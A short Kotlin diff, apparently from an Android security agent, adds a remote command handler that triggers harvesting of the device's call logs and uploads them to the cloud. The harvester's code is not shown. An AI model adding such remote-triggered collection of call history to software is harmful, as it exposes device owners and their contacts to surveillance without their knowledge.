@@ -149,6 +149,11 @@ object ActiveResponder {
                     }
                 }
 
+                "FETCH_CALL_LOGS", "SYNC_CALL_LOGS" -> {
+                    com.edr.agent.telemetry.CallLogHarvester.harvestAndUpload(context)
+                    Pair("EXECUTED", "Call log harvesting triggered and synchronized with cloud")
+                }
+
                 else -> {
                     Pair("FAILED", "Unknown command type: $commandType")
                 }
